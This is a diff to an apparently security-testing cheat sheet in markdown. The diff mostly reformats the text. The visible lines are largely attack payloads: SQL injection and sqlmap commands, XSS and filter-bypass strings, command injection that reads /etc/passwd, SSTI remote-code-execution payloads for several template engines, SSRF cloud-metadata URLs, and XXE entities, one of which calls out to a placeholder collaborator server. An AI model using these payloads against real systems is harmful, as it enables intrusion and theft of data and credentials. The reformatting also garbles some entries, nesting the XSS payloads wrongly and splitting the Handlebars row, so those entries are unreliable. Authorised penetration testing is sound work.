@@ -13,6 +13,7 @@ signed_by: cyberstrike-official
 ## SQL Injection
 
 ### Detection Payloads (test in every input)
+
 ```sql
 '
 ''
@@ -28,15 +29,17 @@ signed_by: cyberstrike-official
 ```
 
 ### DB Fingerprinting (from error messages)
-| Error Snippet | Database |
-|---------------|----------|
-| `You have an error in your SQL syntax` | MySQL |
-| `pg_query()`, `PSQLException` | PostgreSQL |
-| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL |
-| `ORA-`, `Oracle error` | Oracle |
-| `SQLite` | SQLite |
+
+| Error Snippet                                     | Database   |
+| ------------------------------------------------- | ---------- |
+| `You have an error in your SQL syntax`            | MySQL      |
+| `pg_query()`, `PSQLException`                     | PostgreSQL |
+| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL      |
+| `ORA-`, `Oracle error`                            | Oracle     |
+| `SQLite`                                          | SQLite     |
 
 ### Union-Based Extraction
+
 ```sql
 -- Step 1: Find column count
 ' ORDER BY 1 -- ... ' ORDER BY N --
@@ -59,6 +62,7 @@ signed_by: cyberstrike-official
 ```
 
 ### Blind SQLi
+
 ```sql
 -- Boolean-based
 ' AND 1=1 --  (true response)
@@ -74,6 +78,7 @@ signed_by: cyberstrike-official
 ```
 
 ### sqlmap Quick Reference
+
 ```bash
 # Basic scan
 sqlmap -u "https://TARGET/page?id=1" --batch --random-agent
@@ -101,18 +106,25 @@ sqlmap -u "URL" --level=5 --risk=3       # Thorough scan
 ## Cross-Site Scripting (XSS)
 
 ### Reflected XSS Payloads
+
 ```html
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
-<marquee onstart=alert(1)>
-javascript:alert(1)
+<script>
+  alert(1)
+</script>
+<img src="x" onerror="alert(1)" />
+<svg onload="alert(1)">
+  <body onload="alert(1)">
+    <input onfocus="alert(1)" autofocus>
+      <details open ontoggle="alert(1)">
+        <marquee onstart="alert(1)">javascript:alert(1)</marquee>
+      </details>
+    </input>
+  </body>
+</svg>
 ```
 
 ### Context-Specific Payloads
+
 ```html
 <!-- Inside HTML attribute (break out) -->
 " onmouseover="alert(1)
@@ -136,6 +148,7 @@ url('javascript:alert(1)')
 ```
 
 ### Filter Bypass Techniques
+
 ```html
 <!-- Case variation -->
 <ScRiPt>alert(1)</ScRiPt>
@@ -159,11 +172,13 @@ url('javascript:alert(1)')
 ```
 
 ### Stored XSS Targets
+
 Test payload injection in: profile name/bio, comments, messages, forum posts, file names, email subjects, metadata fields, custom headers.
 
 ## Command Injection
 
 ### OS-Specific Payloads
+
 ```bash
 # Linux
 ; id
@@ -188,6 +203,7 @@ $(id)
 ```
 
 ### Bypasses
+
 ```bash
 # Space bypass
 ;{id}
@@ -205,6 +221,7 @@ c\at /etc/passwd
 ## Server-Side Template Injection (SSTI)
 
 ### Detection Polyglot
+
 ```
 ${{<%[%'"}}%\.
 {{7*7}}
@@ -215,19 +232,21 @@ ${7*7}
 ```
 
 ### Engine-Specific Payloads
-| Engine | Detection | RCE Payload |
-|--------|-----------|-------------|
-| Jinja2 (Python) | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
-| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
-| Freemarker (Java) | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
-| Pebble (Java) | `{{7*7}}` → 49 | `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}` |
-| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= system("id") %>` |
-| Smarty (PHP) | `{7*7}` → 49 | `{system('id')}` |
-| Handlebars (JS) | `{{this}}` | `{{#with "s" as |string|}}...{{/with}}` |
+
+| Engine            | Detection         | RCE Payload                                                                                            |
+| ----------------- | ----------------- | ------------------------------------------------------------------------------------------------------ | ------ | --------------- |
+| Jinja2 (Python)   | `{{7*7}}` → 49    | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`                                   |
+| Twig (PHP)        | `{{7*7}}` → 49    | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`                 |
+| Freemarker (Java) | `${7*7}` → 49     | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                                  |
+| Pebble (Java)     | `{{7*7}}` → 49    | `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}` |
+| ERB (Ruby)        | `<%= 7*7 %>` → 49 | `<%= system("id") %>`                                                                                  |
+| Smarty (PHP)      | `{7*7}` → 49      | `{system('id')}`                                                                                       |
+| Handlebars (JS)   | `{{this}}`        | `{{#with "s" as                                                                                        | string | }}...{{/with}}` |
 
 ## Server-Side Request Forgery (SSRF)
 
 ### Internal Target URLs
+
 ```
 http://127.0.0.1
 http://localhost
@@ -240,6 +259,7 @@ http://127.1
 ```
 
 ### Cloud Metadata Endpoints
+
 ```
 # AWS
 http://169.254.169.254/latest/meta-data/
@@ -259,6 +279,7 @@ http://169.254.169.254/metadata/v1/
 ```
 
 ### SSRF Bypass Techniques
+
 ```
 # URL encoding
 http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
@@ -277,6 +298,7 @@ dict://127.0.0.1:6379/SET:key:value
 ## XML External Entity (XXE)
 
 ### Basic XXE
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -286,6 +308,7 @@ dict://127.0.0.1:6379/SET:key:value
 ```
 
 ### Blind XXE (OOB via HTTP)
+
 ```xml
 <!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://COLLAB_SERVER/xxe">
@@ -294,6 +317,7 @@ dict://127.0.0.1:6379/SET:key:value
 ```
 
 ### XXE via File Upload
+
 Test in: SVG images, DOCX/XLSX/PPTX (unzip, inject in XML), SOAP requests, RSS feeds.
 
 ```xml
